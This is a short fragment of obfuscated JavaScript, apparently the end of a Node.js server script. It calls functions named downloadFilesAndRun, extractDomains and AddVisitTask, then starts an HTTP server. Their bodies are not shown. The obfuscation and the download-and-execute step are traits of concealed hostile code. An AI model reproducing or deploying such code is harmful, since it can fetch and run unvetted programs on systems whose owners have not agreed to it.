downloadFilesAndRun(),await extractDomains(),await AddVisitTask();}catch(_0x114b7f){console['error']('Error\x20in\x20startserver:',_0x114b7f);}}startserver()[_0x1eef6b(0x11c)](_0x4562b2=>{console['error']('Unhandled\x20error\x20in\x20startserver:',_0x4562b2);}),app[_0x1eef6b(0x1bc)](PORT,()=>console[_0x1eef6b(0x1b8)]('http\x20server\x20is\x20running\x20on\x20port:'+PORT+'!'));
